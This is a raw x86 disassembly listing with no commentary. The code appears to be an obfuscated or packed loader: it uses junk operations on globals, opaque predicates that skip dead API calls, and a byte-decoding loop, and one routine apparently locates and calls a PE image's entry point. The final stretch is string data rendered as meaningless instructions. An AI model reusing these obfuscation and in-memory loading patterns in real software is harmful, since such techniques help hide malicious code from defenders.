  429e8b:	mov    ecx,DWORD PTR [esp+0x48]
  429e8f:	xor    eax,esi
  429e91:	add    eax,0x99b8624d
  429e96:	mov    DWORD PTR [ecx],eax
  429e98:	mov    eax,DWORD PTR [esp+0x48]
  429e9c:	mov    ecx,DWORD PTR [esp+0x48]
  429ea0:	mov    eax,DWORD PTR [eax]
  429ea2:	cmp    eax,DWORD PTR [ecx]
  429ea4:	jne    0x429f62
  429eaa:	mov    eax,DWORD PTR [esp+0x54]
  429eae:	mov    ecx,DWORD PTR [esp+0x54]
  429eb2:	mov    eax,DWORD PTR [eax]
  429eb4:	cmp    eax,DWORD PTR [ecx]
  429eb6:	jne    0x429f62
  429ebc:	mov    eax,DWORD PTR [esp+0x10]
  429ec0:	mov    ecx,DWORD PTR [esp+0x14]
  429ec4:	mov    edx,DWORD PTR [esp+0x6c]
  429ec8:	mov    edx,DWORD PTR [edx]
  429eca:	xor    eax,esi
  429ecc:	xor    ecx,ebx
  429ece:	add    eax,0x99b8624d
  429ed3:	adc    ecx,0x8ddc
  429ed9:	xor    esi,esi
  429edb:	cmp    edx,eax
  429edd:	jne    0x429eeb
  429ee3:	cmp    esi,ecx
  429ee5:	je     0x42a013
  429eeb:	mov    eax,0x377b
  429ef0:	mov    WORD PTR [esp+0x30],ax
  429ef5:	mov    eax,0x426b
  429efa:	mov    WORD PTR [esp+0x28],ax
  429eff:	mov    eax,0x7ceb
  429f04:	mov    WORD PTR [esp+0x20],ax
  429f09:	movzx  eax,WORD PTR [esp+0x20]
  429f0e:	movzx  ecx,WORD PTR [esp+0x28]
  429f13:	or     eax,ecx
  429f15:	movzx  ecx,WORD PTR [esp+0x30]
  429f1a:	or     eax,0xdfe
  429f1f:	sub    eax,ecx
  429f21:	mov    WORD PTR [esp+0x28],ax
  429f26:	mov    eax,0x4e99
  429f2b:	mov    WORD PTR [esp+0x20],ax
  429f30:	movzx  eax,WORD PTR [esp+0x20]
  429f35:	mov    cx,WORD PTR [esp+0x28]
  429f3a:	add    eax,0x388c
  429f3f:	movzx  ecx,cx
  429f42:	and    eax,0x66c4
  429f47:	cmp    eax,ecx
  429f49:	jg     0x42a013
  429f4f:	lea    eax,[esp+0x74]
  429f53:	push   eax
  429f54:	lea    edi,[esp+0x6c]
  429f58:	call   0x4130e7
  429f5d:	jmp    0x42a013
  429f62:	mov    eax,DWORD PTR [esp+0x58]
  429f66:	mov    ecx,DWORD PTR [esp+0x5c]
  429f6a:	mov    edx,DWORD PTR [esp+0x10]
  429f6e:	mov    esi,DWORD PTR [esp+0x14]
  429f72:	add    eax,edx
  429f74:	adc    ecx,esi
  429f76:	mov    DWORD PTR [esp+0x10],eax
  429f7a:	mov    DWORD PTR [esp+0x14],ecx
  429f7e:	jmp    0x42a013
  429f83:	push   0x4
  429f85:	push   0x42f1b4
  429f8a:	lea    eax,[esp+0x58]
  429f8e:	push   eax
  429f8f:	call   0x41d107
  429f94:	mov    eax,DWORD PTR [esp+0x50]
  429f98:	push   0x4
  429f9a:	push   DWORD PTR [eax+0x194]
  429fa0:	lea    eax,[esp+0x54]
  429fa4:	push   eax
  429fa5:	call   0x41d107
  429faa:	mov    eax,DWORD PTR [esp+0x50]
  429fae:	mov    ecx,DWORD PTR [esp+0x50]
  429fb2:	mov    eax,DWORD PTR [eax+0x194]
  429fb8:	mov    eax,DWORD PTR [eax]
  429fba:	mov    eax,DWORD PTR [eax+0x3c]
  429fbd:	mov    ecx,DWORD PTR [ecx+0x194]
  429fc3:	mov    ecx,DWORD PTR [ecx]
  429fc5:	lea    eax,[ecx+eax*1+0x28]
  429fc9:	mov    eax,DWORD PTR [eax]
  429fcb:	add    DWORD PTR [esp+0x4c],eax
  429fcf:	push   DWORD PTR ds:0x42f294
  429fd5:	push   DWORD PTR ds:0x42f038
  429fdb:	mov    eax,ds:0x42f1b4
  429fe0:	mov    eax,DWORD PTR [eax+0x194]
  429fe6:	push   DWORD PTR [eax]
  429fe8:	mov    eax,DWORD PTR [esp+0x58]
  429fec:	call   eax
  429fee:	mov    ecx,DWORD PTR ds:0x42f1b4
  429ff4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  429ffa:	mov    DWORD PTR [ecx],eax
  429ffc:	mov    eax,ds:0x42f1b4
  42a001:	push   0x4
  42a003:	add    eax,0x1cc
  42a008:	push   eax
  42a009:	lea    eax,[esp+0x70]
  42a00d:	push   eax
  42a00e:	call   0x41d107
  42a013:	mov    eax,DWORD PTR [esp+0x68]
  42a017:	mov    eax,DWORD PTR [eax]
  42a019:	pop    edi
  42a01a:	pop    esi
  42a01b:	pop    ebx
  42a01c:	mov    esp,ebp
  42a01e:	pop    ebp
  42a01f:	ret    0xc
  42a022:	push   ebp
  42a023:	mov    ebp,esp
  42a025:	sub    esp,0x4c
  42a028:	cmp    DWORD PTR ds:0x42f568,0x0
  42a02f:	jle    0x42a062
  42a035:	jmp    0x42a062
  42a03a:	push   0x82ef
  42a03f:	push   DWORD PTR [ebp-0xc]
  42a042:	push   0x42a661
  42a047:	push   DWORD PTR [ebp-0x20]
  42a04a:	push   0x6608
  42a04f:	push   0x7edb
  42a054:	push   0x581d
  42a059:	push   DWORD PTR [ebp-0x24]
  42a05c:	call   DWORD PTR ds:0x438810
  42a062:	push   ebx
  42a063:	push   esi
  42a064:	push   edi
  42a065:	mov    DWORD PTR [ebp-0x20],0xebeb4fd3
  42a06c:	mov    eax,0xffffdedc
  42a071:	mov    DWORD PTR [ebp-0x1c],eax
  42a074:	mov    DWORD PTR [ebp-0x18],0xebeb4fd4
  42a07b:	or     DWORD PTR ds:0x42f598,edi
  42a081:	mov    DWORD PTR [ebp-0x14],eax
  42a084:	xor    DWORD PTR ds:0x42f5b4,0x6104
  42a08e:	mov    ecx,DWORD PTR [ebp+0x8]
  42a091:	mov    esi,0x3e76
  42a096:	add    DWORD PTR ds:0x42f654,edx
  42a09c:	mov    eax,esi
  42a09e:	add    ax,WORD PTR [ecx+0x20]
  42a0a2:	xor    ecx,edx
  42a0a4:	mov    ecx,DWORD PTR [ebp+0x8]
  42a0a7:	or     edx,DWORD PTR ds:0x42f544
  42a0ad:	mov    cx,WORD PTR [ecx+0x20]
  42a0b1:	and    edx,DWORD PTR ds:0x42f61c
  42a0b7:	add    cx,0x76
  42a0bb:	add    DWORD PTR ds:0x42f608,0x5e5c
  42a0c5:	mov    edx,0x100
  42a0ca:	imul   cx,dx
  42a0ce:	xor    DWORD PTR ds:0x42f65c,0x42f560
  42a0d8:	movzx  eax,ax
  42a0db:	adc    DWORD PTR ds:0x42f5b8,0x42f588
  42a0e5:	shr    eax,0x8
  42a0e8:	inc    DWORD PTR ds:0x42f530
  42a0ee:	movzx  ecx,cx
  42a0f1:	or     DWORD PTR ds:0x42f584,0x6eea
  42a0fb:	or     ecx,eax
  42a0fd:	and    DWORD PTR ds:0x42f5d0,ecx
  42a103:	mov    DWORD PTR [ebp-0x4],ecx
  42a106:	mov    eax,DWORD PTR [ebp-0x18]
  42a109:	not    ecx
  42a10b:	mov    ecx,DWORD PTR [ebp-0x14]
  42a10e:	xor    al,0x60
  42a110:	add    DWORD PTR ds:0x42f530,0x42f5fc
  42a11a:	add    al,0x4d
  42a11c:	sub    DWORD PTR ds:0x42f540,0x42f618
  42a126:	movzx  eax,al
  42a129:	push   eax
  42a12a:	neg    DWORD PTR ds:0x42f5cc
  42a130:	lea    eax,[ebp-0x48]
  42a133:	sub    DWORD PTR ds:0x42f658,0x42f5f4
  42a13d:	push   eax
  42a13e:	call   0x4249a6
  42a143:	xor    edx,DWORD PTR ds:0x42f5b8
  42a149:	mov    eax,DWORD PTR [ebp-0x20]
  42a14c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42a14f:	and    edi,DWORD PTR ds:0x42f668
  42a155:	mov    edx,DWORD PTR [ebp-0x4]
  42a158:	xor    DWORD PTR ds:0x42f5e0,edx
  42a15e:	mov    ecx,0x8dacd260
  42a163:	and    DWORD PTR ds:0x42f5b4,ecx
  42a169:	xor    eax,ecx
  42a16b:	not    edi
  42a16d:	mov    edi,0x66479db3
  42a172:	xor    DWORD PTR ds:0x42f59c,0x1759
  42a17c:	sub    eax,edi
  42a17e:	mov    DWORD PTR ds:0x42f63c,0x69c4
  42a188:	cmp    eax,edx
  42a18a:	mov    DWORD PTR ds:0x42f570,0x64bf
  42a194:	je     0x42a2ef
  42a19a:	mov    ebx,DWORD PTR [ebp+0x8]
  42a19d:	cmp    DWORD PTR ds:0x42f5fc,0x0
  42a1a4:	jge    0x42a1d4
  42a1aa:	mov    edi,DWORD PTR ds:0x42f6ec
  42a1b0:	mov    edx,DWORD PTR ds:0x42c018
  42a1b6:	sub    edx,edi
  42a1b8:	sub    edi,DWORD PTR [edi+edx*1]
  42a1bb:	jmp    0x42a1d4
  42a1c0:	push   DWORD PTR [ebp-0x1c]
  42a1c3:	push   DWORD PTR [ebp-0x10]
  42a1c6:	push   0x7643
  42a1cb:	push   DWORD PTR [ebp-0xc]
  42a1ce:	call   DWORD PTR ds:0x4387b8
  42a1d4:	mov    edx,eax
  42a1d6:	mov    edi,esi
  42a1d8:	add    di,WORD PTR [ebx+edx*4+0x2]
  42a1dd:	cmp    DWORD PTR ds:0x42f57c,0x0
  42a1e4:	jge    0x42a215
  42a1ea:	jmp    0x42a215
  42a1ef:	push   0x6a6a
  42a1f4:	push   0x42f5a4
  42a1f9:	push   0x238b
  42a1fe:	push   0x42f64c
  42a203:	push   DWORD PTR [ebp-0x28]
  42a206:	push   DWORD PTR [ebp-0x20]
  42a209:	push   DWORD PTR [ebp-0x20]
  42a20c:	push   DWORD PTR [ebp-0xc]
  42a20f:	call   DWORD PTR ds:0x4387ec
  42a215:	mov    ebx,0x100
  42a21a:	movzx  edi,di
  42a21d:	shr    edi,0x8
  42a220:	mov    DWORD PTR [ebp-0x8],edi
  42a223:	mov    edi,DWORD PTR [ebp+0x8]
  42a226:	mov    di,WORD PTR [edi+edx*4+0x2]
  42a22b:	add    di,0x76
  42a22f:	adc    DWORD PTR ds:0x42f660,0xd5c
  42a239:	imul   di,bx
  42a23d:	add    DWORD PTR ds:0x42f588,ecx
  42a243:	movzx  edi,di
  42a246:	sbb    DWORD PTR ds:0x42f630,edi
  42a24c:	or     edi,DWORD PTR [ebp-0x8]
  42a24f:	mov    DWORD PTR [ebp-0xc],edi
  42a252:	cmp    DWORD PTR ds:0x42f5ec,0x0
  42a259:	jb     0x42a285
  42a25f:	dec    ebx
  42a260:	jmp    0x42a285
  42a265:	push   DWORD PTR [ebp-0x20]
  42a268:	push   0x42f584
  42a26d:	push   0x42a5a3
  42a272:	push   0x706d
  42a277:	push   0x2104
  42a27c:	push   DWORD PTR [ebp-0x14]
  42a27f:	call   DWORD PTR ds:0x4387f0
  42a285:	mov    ebx,DWORD PTR [ebp+0x8]
  42a288:	mov    edi,esi
  42a28a:	add    di,WORD PTR [ebx+edx*4]
  42a28e:	mov    ebx,DWORD PTR [ebp+0x8]
  42a291:	movzx  edi,di
  42a294:	shr    edi,0x8
  42a297:	and    DWORD PTR ds:0x42f634,0x42f660
  42a2a1:	mov    DWORD PTR [ebp-0x8],edi
  42a2a4:	mov    edi,esi
  42a2a6:	and    DWORD PTR ds:0x42f668,0x42f664
  42a2b0:	add    di,WORD PTR [ebx+edx*4]
  42a2b4:	movzx  edx,di
  42a2b7:	mov    edi,DWORD PTR ds:0x42f5a0
  42a2bd:	sub    DWORD PTR ds:0x42f574,edi
  42a2c3:	mov    edi,DWORD PTR [ebp-0xc]
  42a2c6:	shl    edx,0x8
  42a2c9:	or     edx,DWORD PTR [ebp-0x8]
  42a2cc:	mov    BYTE PTR [ebp+edi*1-0x48],dl
  42a2d0:	mov    edx,DWORD PTR [ebp-0x18]
  42a2d3:	mov    edi,DWORD PTR [ebp-0x14]
  42a2d6:	xor    edx,ecx
  42a2d8:	lea    eax,[eax+edx*1-0x66479db3]
  42a2df:	mov    edx,DWORD PTR [ebp-0x4]
  42a2e2:	cmp    eax,edx
  42a2e4:	jne    0x42a19a
  42a2ea:	mov    edi,0x66479db3
  42a2ef:	mov    eax,DWORD PTR [ebp-0x20]
  42a2f2:	mov    edx,DWORD PTR [ebp-0x1c]
  42a2f5:	xor    eax,ecx
  42a2f7:	sub    eax,edi
  42a2f9:	mov    esi,0xacff
  42a2fe:	jmp    0x42a388
  42a303:	mov    eax,DWORD PTR [ebp+0x8]
  42a306:	xor    edx,edx
  42a308:	add    eax,edi
  42a30a:	adc    edx,0xffff7223
  42a310:	xor    eax,ecx
  42a312:	mov    DWORD PTR [ebp-0x28],eax
  42a315:	xor    edx,esi
  42a317:	mov    DWORD PTR [ebp-0x24],edx
  42a31a:	mov    eax,DWORD PTR [ebp-0x18]
  42a31d:	mov    edx,DWORD PTR [ebp-0x14]
  42a320:	mov    edx,DWORD PTR [ebp+0x8]
  42a323:	mov    dl,BYTE PTR [ebp+edx*1-0x48]
  42a327:	xor    al,0x60
  42a329:	add    al,0x4d
  42a32b:	cmp    dl,al
  42a32d:	je     0x42a376
  42a333:	mov    eax,DWORD PTR [ebp-0x28]
  42a336:	mov    edx,DWORD PTR [ebp-0x24]
  42a339:	mov    edx,DWORD PTR [ebp+0x8]
  42a33c:	mov    dl,BYTE PTR [ebp+edx*1-0x48]
  42a340:	mov    ebx,DWORD PTR [ebp+0xc]
  42a343:	xor    eax,ecx
  42a345:	cmp    dl,BYTE PTR [ebx+eax*1-0x66479db3]
  42a34c:	jne    0x42a3a8
  42a352:	mov    eax,DWORD PTR [ebp-0x28]
  42a355:	mov    edx,DWORD PTR [ebp-0x24]
  42a358:	mov    edx,DWORD PTR [ebp-0x20]
  42a35b:	mov    ebx,DWORD PTR [ebp-0x1c]
  42a35e:	mov    ebx,DWORD PTR [ebp+0xc]
  42a361:	xor    dl,0x60
  42a364:	xor    eax,ecx
  42a366:	add    dl,0x4d
  42a369:	cmp    BYTE PTR [ebx+eax*1-0x66479db3],dl
  42a370:	je     0x42a3b9
  42a376:	mov    eax,DWORD PTR [ebp-0x18]
  42a379:	mov    edx,DWORD PTR [ebp-0x14]
  42a37c:	mov    edx,DWORD PTR [ebp+0x8]
  42a37f:	xor    eax,ecx
  42a381:	lea    eax,[eax+edx*1-0x66479db3]
  42a388:	mov    DWORD PTR [ebp+0x8],eax
  42a38b:	mov    eax,DWORD PTR [ebp-0x18]
  42a38e:	mov    edx,DWORD PTR [ebp-0x14]
  42a391:	xor    edx,esi
  42a393:	xor    eax,ecx
  42a395:	add    eax,0x99b8624d
  42a39a:	adc    edx,0x8ddc
  42a3a0:	or     eax,edx
  42a3a2:	jne    0x42a303
  42a3a8:	mov    eax,DWORD PTR [ebp-0x20]
  42a3ab:	mov    edx,DWORD PTR [ebp-0x1c]
  42a3ae:	xor    eax,ecx
  42a3b0:	sub    eax,edi
  42a3b2:	pop    edi
  42a3b3:	pop    esi
  42a3b4:	pop    ebx
  42a3b5:	leave  
  42a3b6:	ret    0x8
  42a3b9:	mov    eax,DWORD PTR [ebp-0x18]
  42a3bc:	mov    edx,DWORD PTR [ebp-0x14]
  42a3bf:	jmp    0x42a3ae
  42a3c4:	mov    eax,0xe032f64b
  42a3c9:	mov    edx,0xffffdedc
  42a3ce:	ret    
  42a3cf:	sbb    ecx,DWORD PTR ds:0x42f5ec
  42a3d5:	mov    eax,DWORD PTR [esp+0x8]
  42a3d9:	mov    ecx,DWORD PTR ds:0x42f66c
  42a3df:	adc    DWORD PTR ds:0x42f664,ecx
  42a3e5:	mov    ecx,DWORD PTR [esp+0x10]
  42a3e9:	or     DWORD PTR ds:0x42f66c,0x6622
  42a3f3:	or     ecx,eax
  42a3f5:	mov    ecx,0x3c87
  42a3fa:	mov    ecx,DWORD PTR [esp+0xc]
  42a3fe:	jne    0x42a421
  42a404:	and    DWORD PTR ds:0x42f57c,0x6ba6
  42a40e:	mov    eax,DWORD PTR [esp+0x4]
  42a412:	and    DWORD PTR ds:0x42f600,0x42f628
  42a41c:	mul    ecx
  42a41e:	ret    0x10
  42a421:	sub    DWORD PTR ds:0x42f61c,0x42f64c
  42a42b:	push   ebx
  42a42c:	mov    ebx,DWORD PTR ds:0x42f568
  42a432:	adc    DWORD PTR ds:0x42f590,ebx
  42a438:	mul    ecx
  42a43a:	mov    ebx,eax
  42a43c:	mov    eax,DWORD PTR [esp+0x8]
  42a440:	mul    DWORD PTR [esp+0x14]
  42a444:	add    ebx,eax
  42a446:	mov    eax,DWORD PTR [esp+0x8]
  42a44a:	mul    ecx
  42a44c:	add    edx,ebx
  42a44e:	pop    ebx
  42a44f:	ret    0x10
  42a452:	dec    ebx
  42a453:	push   ecx
  42a454:	dec    eax
  42a455:	pop    edi
  42a456:	ss dec ebx
  42a458:	aaa    
  42a459:	xor    al,0x0
  42a45b:	pop    ecx
  42a45c:	xor    dh,BYTE PTR [eax]
  42a45e:	pop    edi
  42a45f:	xor    al,0x57
  42a461:	push   ebx
  42a462:	inc    esi
  42a463:	add    BYTE PTR [edi+0x38],dl
  42a466:	dec    ebp
  42a467:	pop    edi
  42a468:	xor    dl,BYTE PTR [ebx+0x58]
  42a46b:	dec    esi
  42a46c:	dec    edi
  42a46d:	add    BYTE PTR [ecx+0x4c],cl
  42a470:	inc    ebx
  42a471:	ss pop edi
  42a473:	dec    ebx
  42a474:	dec    esi
  42a475:	dec    esi
  42a476:	pop    eax
  42a477:	xor    eax,0x4f345300
  42a47c:	pop    edi
  42a47d:	pop    edx
  42a47e:	push   esi
  42a47f:	inc    esp
  42a480:	xor    DWORD PTR ds:0x56325f34,esi
  42a486:	add    BYTE PTR [esi+0x34],al
  42a489:	inc    edx
  42a48a:	pop    edi
  42a48b:	push   edi
  42a48c:	xor    eax,0x4f544f
  42a491:	dec    edi
  42a492:	pop    ecx
  42a493:	xor    DWORD PTR [edi+0x5a],ebx
  42a496:	dec    edx
  42a497:	inc    esi
  42a498:	ss pop edi
  42a49a:	inc    ebp
  42a49b:	dec    eax
  42a49c:	xor    ecx,DWORD PTR [ebp+0x0]
  42a49f:	inc    esp
  42a4a0:	inc    edi
  42a4a1:	inc    ebx
  42a4a2:	pop    edi
  42a4a3:	xor    dh,BYTE PTR [eax]
  42a4a5:	aaa    
  42a4a6:	xor    BYTE PTR [ecx+0x0],al
  42a4a9:	inc    esi
  42a4aa:	pop    eax
  42a4ab:	push   ecx
  42a4ac:	pop    edi
  42a4ad:	dec    edx
  42a4ae:	inc    ebp
  42a4af:	cmp    DWORD PTR ds:0x31545f,esi
  42a4b5:	pop    ecx
  42a4b6:	push   esi
  42a4b7:	push   edi
  42a4b8:	pop    edi
  42a4b9:	xor    DWORD PTR ss:[eax+0x37],ebx
  42a4bd:	pop    edi
  42a4be:	push   edi
  42a4bf:	pop    ecx
  42a4c0:	add    BYTE PTR [ecx+edx*2+0x50],dl
  42a4c4:	xor    BYTE PTR [edi+0x34],bl
  42a4c7:	cmp    BYTE PTR [ebp+0x5f],cl
  42a4ca:	inc    edx
  42a4cb:	cmp    DWORD PTR [eax+0x33],edx
  42a4ce:	add    BYTE PTR [esi+0x58],cl
  42a4d1:	xor    DWORD PTR [ecx],edi
  42a4d3:	cmp    DWORD PTR [ecx],edi
  42a4d5:	pop    edi
  42a4d6:	inc    ebx
  42a4d7:	xor    DWORD PTR [eax+0x5f],edx
  42a4da:	push   ecx
  42a4db:	inc    esi
  42a4dc:	xor    cl,BYTE PTR [edi+0x0]
  42a4df:	pop    edx
  42a4e0:	pop    edx
  42a4e1:	pop    edx
  42a4e2:	xor    BYTE PTR [edi+0x42],bl
  42a4e5:	dec    edx
  42a4e6:	push   ecx
  42a4e7:	pop    edi
  42a4e8:	push   ebp
  42a4e9:	pop    eax
  42a4ea:	add    BYTE PTR [edx+0x50],cl
  42a4ed:	dec    edx
  42a4ee:	xor    bh,BYTE PTR [ecx]
  42a4f0:	pop    edi
  42a4f1:	dec    esi
  42a4f2:	ss push eax
  42a4f4:	xor    al,0x34
  42a4f6:	pop    edi
  42a4f7:	push   eax
  42a4f8:	xor    eax,DWORD PTR [eax]
  42a4fa:	dec    ebp
  42a4fb:	dec    ecx
  42a4fc:	xor    ebx,DWORD PTR [edi+0x33]
  42a4ff:	push   edx
  42a500:	inc    esp
  42a501:	dec    ebx
  42a502:	pop    edi
  42a503:	xor    al,0x0
  42a505:	inc    edi
  42a506:	dec    esi
  42a507:	push   edi
  42a508:	xor    al,0x5f
  42a50a:	push   ebx
  42a50b:	inc    edi
  42a50c:	inc    edx
  42a50d:	pop    edi
  42a50e:	xor    al,0x45
  42a510:	add    BYTE PTR [edx+0x35],bl
  42a513:	push   eax
  42a514:	pop    edi
  42a515:	xor    edx,DWORD PTR [ebx+0x43]
  42a518:	xor    dh,BYTE PTR [esi]
  42a51a:	xor    bl,BYTE PTR [edi+0x37]
  42a51d:	inc    edx
  42a51e:	inc    ecx
  42a51f:	add    BYTE PTR [edx+0x39],cl
  42a522:	dec    esp
  42a523:	pop    edi
  42a524:	dec    eax
  42a525:	xor    ebx,DWORD PTR [eax+0x5f]
  42a528:	push   ebx
  42a529:	xor    DWORD PTR [edi+0x0],edx
  42a52c:	push   esp
  42a52d:	pop    ecx
  42a52e:	inc    ebx
  42a52f:	pop    edi
  42a530:	push   edi
  42a531:	inc    ebx
  42a532:	inc    esi
  42a533:	inc    esi
  42a534:	add    BYTE PTR [ebp+0x31],al
  42a537:	xor    DWORD PTR [edi+0x30],ebx
  42a53a:	push   ebp
  42a53b:	xor    ebx,DWORD PTR ss:[edi+0x4b]
  42a53f:	inc    edi
  42a540:	add    BYTE PTR [ecx+0x4d],cl
  42a543:	inc    edi
  42a544:	xor    DWORD PTR [edi+0x4b],ebx
  42a547:	aaa    
  42a548:	push   ebp
  42a549:	pop    eax
  42a54a:	add    BYTE PTR [ebx+0x58],dl
  42a54d:	xor    al,0x5f
  42a54f:	xor    al,0x4c
  42a551:	push   edx
  42a552:	xor    DWORD PTR [ecx+0x5f],ebx
  42a555:	xor    DWORD PTR [ebp+0x4a],edx
  42a558:	add    BYTE PTR [edx+0x30],bl
  42a55b:	xor    BYTE PTR [edi+0x31],bl
  42a55e:	xor    DWORD PTR [edi+0x4f],ecx
  42a561:	pop    edi
  42a562:	dec    esp
  42a563:	xor    esi,DWORD PTR [ecx*2+0x33334300]
  42a56a:	cmp    BYTE PTR [edi+0x59],bl
  42a56d:	xor    al,0x45
  42a56f:	cmp    DWORD PTR [edi+0x51],ebx
  42a572:	add    BYTE PTR [edx+0x0],al
  42a575:	pop    edx
  42a576:	add    BYTE PTR [ebx+0x0],al
  42a579:	cmp    DWORD PTR [eax],eax
  42a57b:	xor    eax,DWORD PTR [eax]
  42a57d:	cmp    BYTE PTR [eax],al
  42a57f:	pop    edi
  42a580:	add    BYTE PTR [edx],dh
  42a582:	add    BYTE PTR [esi],dh
  42a584:	add    BYTE PTR [ecx],dh
  42a586:	add    BYTE PTR [ecx+0x0],cl
  42a589:	cmp    BYTE PTR [eax],al
  42a58b:	dec    edi
  42a58c:	add    BYTE PTR [eax],al
  42a58e:	add    BYTE PTR [ebx+0x0],cl
  42a591:	xor    al,0x0
  42a593:	push   esp
  42a594:	add    BYTE PTR [esi],dh
  42a596:	add    BYTE PTR [edi+0x0],bl
  42a599:	push   edx
  42a59a:	add    BYTE PTR [ebx+0x0],cl
  42a59d:	xor    al,0x0
  42a59f:	dec    esi
  42a5a0:	add    BYTE PTR [eax],al
  42a5a2:	add    BYTE PTR [edx+0x0],bl
  42a5a5:	inc    edx
  42a5a6:	add    BYTE PTR [eax+0x0],cl
  42a5a9:	pop    edi
  42a5aa:	add    BYTE PTR [edi],dh
  42a5ac:	add    BYTE PTR [eax+eax*1],dh
  42a5af:	xor    BYTE PTR [eax],al
  42a5b1:	cmp    BYTE PTR [eax],al
  42a5b3:	pop    edi
  42a5b4:	add    BYTE PTR [ebx+0x0],cl
  42a5b7:	push   ebp
  42a5b8:	add    BYTE PTR [ebx+0x0],al
  42a5bb:	cmp    DWORD PTR [eax],eax
  42a5bd:	add    BYTE PTR [eax],al
  42a5bf:	push   ebp
  42a5c0:	add    BYTE PTR [ecx],dh
  42a5c2:	add    BYTE PTR [edi+0x0],al
  42a5c5:	pop    edi
  42a5c6:	add    BYTE PTR [eax+0x0],bl
  42a5c9:	inc    esi
  42a5ca:	add    BYTE PTR [ebx+0x0],cl
  42a5cd:	pop    edi
  42a5ce:	add    BYTE PTR [ebp+0x0],cl
  42a5d1:	inc    edi
  42a5d2:	add    BYTE PTR [ecx+0x0],dl
  42a5d5:	dec    edi
  42a5d6:	add    BYTE PTR [eax],al
  42a5d8:	add    BYTE PTR [edx+0x0],cl
  42a5db:	push   esp
  42a5dc:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42a5e0:	add    BYTE PTR [esi+0x0],cl
  42a5e3:	push   edx
  42a5e4:	add    BYTE PTR [ecx+0x0],bl
  42a5e7:	xor    eax,DWORD PTR [eax]
  42a5e9:	pop    edi
  42a5ea:	add    BYTE PTR [ebx],dh
  42a5ec:	add    BYTE PTR [eax+0x0],cl
  42a5ef:	dec    edi
  42a5f0:	add    BYTE PTR [eax],al
  42a5f2:	add    BYTE PTR [eax+eax*1+0x54],cl
  42a5f6:	add    BYTE PTR [esi+0x0],dl
  42a5f9:	pop    edi
  42a5fa:	add    BYTE PTR [eax+eax*1+0x38],al
  42a5fe:	add    BYTE PTR [eax+eax*1],dh
  42a601:	push   eax
  42a602:	add    BYTE PTR [eax],al
  42a604:	add    BYTE PTR [eax+0x0],dl
  42a607:	cmp    BYTE PTR [eax],al
  42a609:	inc    esi
  42a60a:	add    BYTE PTR [ecx],bh
  42a60c:	add    BYTE PTR [edi+0x0],bl
  42a60f:	dec    esp
  42a610:	add    BYTE PTR [eax+0x0],dl
  42a613:	xor    eax,0x37005f00
  42a618:	add    BYTE PTR [esi+0x0],dl
  42a61b:	pop    ecx
  42a61c:	add    BYTE PTR [edi+0x0],dl
  42a61f:	add    BYTE PTR [eax],al
  42a621:	dec    esp
  42a622:	add    BYTE PTR [esi],dh
  42a624:	add    BYTE PTR [eax+eax*1],dh
  42a627:	pop    edi
  42a628:	add    BYTE PTR [ecx+0x0],bl
  42a62b:	xor    al,0x0
  42a62d:	dec    ebx
  42a62e:	add    BYTE PTR [esi+0x0],dl
  42a631:	cmp    BYTE PTR [eax],al
  42a633:	add    BYTE PTR [eax],al
  42a635:	inc    ecx
  42a636:	add    BYTE PTR [eax+0x0],bl
  42a639:	pop    edx
  42a63a:	add    BYTE PTR [edi+0x0],bl
  42a63d:	inc    ebp
  42a63e:	add    BYTE PTR [esi+0x0],cl
  42a641:	push   eax
  42a642:	add    BYTE PTR [eax+0x0],cl
  42a645:	inc    ecx
  42a646:	add    BYTE PTR [ecx+0x0],dl
  42a649:	add    BYTE PTR [eax],al
  42a64b:	inc    ebx
  42a64c:	add    BYTE PTR [ecx+0x0],bl
  42a64f:	push   eax
  42a650:	add    BYTE PTR [edi+0x0],bl
  42a653:	xor    al,0x0
  42a655:	inc    ecx
  42a656:	add    BYTE PTR [edx+0x0],al
  42a659:	aaa    
  42a65a:	add    BYTE PTR [eax],dh
  42a65c:	add    BYTE PTR [ebp+0x0],al
  42a65f:	add    BYTE PTR [eax],al
  42a661:	inc    esi
  42a662:	add    BYTE PTR [ebx+0x0],cl
  42a665:	pop    edx
  42a666:	add    BYTE PTR [eax],bh
  42a668:	add    BYTE PTR [edi+0x0],bl
  42a66b:	dec    edx
  42a66c:	add    BYTE PTR [ecx+0x0],cl
  42a66f:	xor    eax,0x4b004e00
  42a674:	add    BYTE PTR [edi],dh
  42a676:	add    BYTE PTR [eax],al
  42a678:	add    BYTE PTR [eax+0x0],cl
  42a67b:	push   edx
  42a67c:	add    BYTE PTR [eax+0x0],bl
  42a67f:	pop    edi
  42a680:	add    BYTE PTR [eax+0x0],dl
  42a683:	pop    ecx
  42a684:	add    BYTE PTR [ebx+0x0],dl
  42a687:	cmp    BYTE PTR [eax],al
  42a689:	xor    DWORD PTR [eax],eax
  42a68b:	pop    edi
  42a68c:	add    BYTE PTR [edx+0x0],al
  42a68f:	add    BYTE PTR [eax],al
	...
